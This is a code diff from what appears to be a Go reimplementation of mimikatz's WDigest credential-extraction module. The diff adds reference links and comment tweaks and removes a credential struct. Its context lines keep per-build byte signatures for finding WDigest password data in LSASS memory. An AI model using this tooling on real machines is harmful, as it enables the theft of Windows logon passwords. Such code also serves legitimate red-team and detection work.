@@ -14,10 +14,13 @@ import (
 	"project/internal/module/windows/api"
 )
 
+// reference:
+// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_wdigest.c
+
 var (
 	patternWin5xX64PasswordSet = []byte{0x48, 0x3B, 0xDA, 0x74}
 	patternWin6xX64PasswordSet = []byte{0x48, 0x3B, 0xD9, 0x74}
-	// key = build
+	// key = build version
 	wdigestReferencesX64 = map[uint32]*patchGeneric{
 		buildWinXP: {
 			search: &patchPattern{
@@ -52,7 +55,7 @@ var (
 	patternWin63X86PasswordSet      = []byte{0x74, 0x15, 0x8B, 0x0A, 0x39, 0x4E, 0x10}
 	patternWin64X86PasswordSet      = []byte{0x74, 0x15, 0x8B, 0x0F, 0x39, 0x4E, 0x10}
 	patternWin10v1809X86PasswordSet = []byte{0x74, 0x15, 0x8b, 0x17, 0x39, 0x56, 0x10}
-	// key = build
+	// key = build version
 	wdigestReferencesX86 = map[uint32]*patchGeneric{
 		buildWinXP: {
 			search: &patchPattern{
@@ -136,18 +139,15 @@ func (kiwi *Kiwi) searchWdigestCredentialAddress(pHandle windows.Handle) error {
 	return nil
 }
 
+// reference:
+// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_wdigest.h
+
 type wdigestListEntry struct {
 	fLink      uintptr
 	bLink      uintptr
 	usageCount uint32
 	this       uintptr
 	luid       windows.LUID
-}
-
-type genericPrimaryCredential struct {
-	Username api.LSAUnicodeString
-	Domain   api.LSAUnicodeString
-	Password api.LSAUnicodeString
 }
 
 // Wdigest contains credential information.
